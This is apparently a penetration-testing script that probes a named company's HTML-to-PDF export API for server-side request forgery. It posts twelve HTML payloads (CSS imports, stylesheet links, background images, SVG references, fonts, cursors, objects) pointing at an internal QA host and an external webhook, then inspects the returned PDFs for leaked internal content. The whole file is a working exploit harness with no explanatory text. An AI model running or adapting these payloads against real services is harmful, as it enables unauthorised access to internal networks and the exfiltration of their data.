import json,subprocess,os,re,zlib,uuid,time
H=os.environ['H']; BB=os.environ['BB']; WH=os.environ['WH']
TA=open('/tmp/tok_A').read().strip()
def gen(html,name):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/document_intelligence/export/pdf',
         '-H','token: '+TA,'-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"htmlContent":html,"fileName":name})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read()).get('url')
    except: return c,None
def streams(url):
    subprocess.run(['curl','-s','-m','60','-o','/tmp/v.pdf',url])
    d=open('/tmp/v.pdf','rb').read()
    out=[]
    for m in re.finditer(rb'stream\r?\n(.*?)endstream',d,re.S):
        try: out.append(zlib.decompress(m.group(1)).decode('latin-1'))
        except: pass
    return d,'\n'.join(out)
tag='zx'+uuid.uuid4().hex[:8]
INT='http://integrations.qa.soxhubapp.com/version'
INT2='http://integrations.qa.soxhubapp.com/api/v1/health'
vectors=[
 ("css-import",      f'<style>@import url("{INT}");</style><p>ZX</p>'),
 ("css-import-ext",  f'<style>@import url("{WH}/{tag}-import.css");</style><p>ZX</p>'),
 ("link-stylesheet", f'<link rel="stylesheet" href="{INT}"><p>ZX</p>'),
 ("link-ext",        f'<link rel="stylesheet" href="{WH}/{tag}-link.css"><p>ZX</p>'),
 ("bg-image",        f'<div style="background-image:url({INT});width:900px;height:700px">ZX</div>'),
 ("bg-image-ext",    f'<div style="background-image:url({WH}/{tag}-bg.png);width:900px;height:700px">ZX</div>'),
 ("svg-use",         f'<svg width="900" height="700"><use href="{INT}"/></svg>'),
 ("svg-image",       f'<svg width="900" height="700"><image href="{INT}" width="900" height="700"/></svg>'),
 ("svg-image-ext",   f'<svg width="900" height="700"><image href="{WH}/{tag}-svg.png" width="900" height="700"/></svg>'),
 ("css-font",        f'<style>@font-face{{font-family:x;src:url({INT})}}body{{font-family:x}}</style><p>ZX</p>'),
 ("css-cursor",      f'<div style="cursor:url({INT}),auto;width:900px;height:700px">ZX</div>'),
 ("object-css",      f'<object data="{INT2}" type="text/css" width="900" height="700"></object>'),
]
print(f"{'vector':20} {'gen':>4} {'pdf':>7} {'Tj':>3}  internal-content?")
for label,html in vectors:
    c,url=gen(html,f"zx-{tag}-{label}")
    if not url:
        print(f"{label:20} {c:>4} {'-':>7} {'-':>3}  no url")
        continue
    d,s=streams(url)
    hit='v1.16.1' in s or 'v1.16.1' in d.decode('latin-1',errors='replace')
    print(f"{label:20} {c:>4} {len(d):>7} {s.count('Tj'):>3}  {'*** YES ***' if hit else 'no'}")
open('/tmp/tag261','w').write(tag)
